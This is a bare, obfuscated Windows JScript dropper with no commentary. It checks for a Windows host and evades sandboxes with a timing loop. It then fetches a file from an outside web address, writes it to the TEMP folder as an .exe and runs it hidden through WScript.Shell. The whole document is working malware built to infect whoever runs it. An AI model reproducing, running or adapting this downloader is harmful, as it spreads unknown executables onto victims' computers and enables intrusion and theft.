var L = false;
var wm = "CreateObject";
var hQ = function D() {return WScript[wm]("WScript.Shell");}(), G = 11;
var x = "MSXML2.XMLHTTP";
var fT = 2123213;
var el = 0;
function nO(NQ){hQ["Run"](NQ, el, el);};
function m(){return "" + x;};
function c(BF, u){el = el * 1; return BF - u;};
function xd(){return wm;};
/*@cc_on
  @if (@_win32 || @_win64)
    L = true;
  @end
@*/
if (L)
{
var Q = "";
function t(){return 22;};
var fS = 0; var BY = 0;
function Mp()
{
var XS = new this["Date"]();
var Iu = XS["getUTCMilliseconds"]();
WScript["Sleep"](t());
var XS = new this["Date"]();
var v = XS["getUTCMilliseconds"]();
WScript["Sleep"](t());
var XS = new this["Date"]();
var nR = XS["getUTCMilliseconds"]();
var fS = "ds";
fS = c(v, Iu);
var BY = "wH";
BY = c(nR, v);
Q = "open";
return c(fS, BY);
}
var p = false;
var k = false;
for (var J = el; J < t() * 1; J++){if (Mp() != el){
p = true; 
BY = "31" + 11 * fS + BY; 
k = true; 
break;
}}
function eP() {return ((p == true) && (p == k)) ? 1 : el;};
if (p && eP() && k){
function Pj() {return hQ["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "rvxwIjPkAiNX.exe";};
 ir = m();
 m0 = WScript[wm](ir);
 var e = 1;
 while (e){
try {
m0[Q]("GET", "http://www.aluguerdiadema.com/p9wsld", false);
m0["send"]();
I = "Sleep";
for (;;){WScript[I](t() * 11); if (m0["readystate"] >= 2 * 2) break;};
e = el;
} catch(T){};
}
function SP(EF) {var EO = (1, 2, 3, 4, 5, EF); return EO;};
iR = WScript[xd()]("ADODB.Stream");
ir = iR;
ir[Q]();
ir["type"] = SP(1);
ir["write"](m0["ResponseBody"]);
iR["position"] = SP(el);
ir["Save" + "ToFile"](Pj(), 2);
iR["c"+"lose"]();
t0 = Pj();
nO(t0);
}
}

